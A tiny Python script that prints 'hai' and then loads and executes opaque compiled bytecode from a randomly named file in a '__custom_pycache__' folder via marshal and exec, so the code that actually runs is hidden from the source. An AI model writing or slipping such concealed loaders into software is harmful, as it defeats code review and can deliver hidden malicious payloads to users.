
import marshal
import os
print("hai")
s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Api_15b08df5703140189a392888b22e0a78.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
